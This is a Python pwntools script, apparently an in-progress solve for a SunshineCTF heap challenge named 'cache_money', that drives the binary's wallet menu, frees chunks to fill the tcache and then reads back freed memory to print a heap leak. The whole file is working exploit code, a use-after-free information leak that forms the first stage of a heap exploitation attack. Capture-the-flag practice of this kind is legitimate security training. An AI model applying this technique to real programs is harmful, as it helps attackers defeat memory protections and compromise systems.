import sys, os, re
_ARGV=list(sys.argv); REMOTE=('REMOTE' in _ARGV)
from pwn import *
HERE='/home/kzzz/Documents/code/ctf/sunshine/pwn4'
context.arch='amd64'; context.log_level='info'
io = remote('chal.sunshinectf.games',26004) if REMOTE else process([HERE+'/ld-linux-x86-64.so.2','--library-path',HERE,HERE+'/cache_money'])
def menu(c): io.sendlineafter(b'>>> ', str(c).encode())
def ow(n,s):
    menu(1); io.sendlineafter(b'Wallet name: ',n); io.sendlineafter(b'Ledger size',str(s).encode()); io.recvuntil(b'\n')
def cw(i):
    menu(5); io.sendlineafter(b'(0-15): ',str(i).encode()); io.recvuntil(b'CACHE MONEY!')
def tr(a,b):
    menu(4); io.sendlineafter(b'(0-15): ',str(a).encode()); io.sendlineafter(b'(0-15): ',str(b).encode()); io.recvuntil(b'Smart money move!')
def wd(i,n):
    menu(3); io.sendlineafter(b'(0-15): ',str(i).encode()); io.recvuntil(b'bytes):\n    '); d=io.recvn(n); io.recvuntil(b'Current balance:'); return d
ow(b'S',0x80); ow(b'D',0x80)
for i in range(7): ow(b'W%d'%i,0x80)
for i in range(2,9): cw(i)
tr(0,1)
leak=wd(1,0x80)
for i in range(0,0x40,8):
    print('%02x: %#018x' % (i, u64(leak[i:i+8])))
io.close()
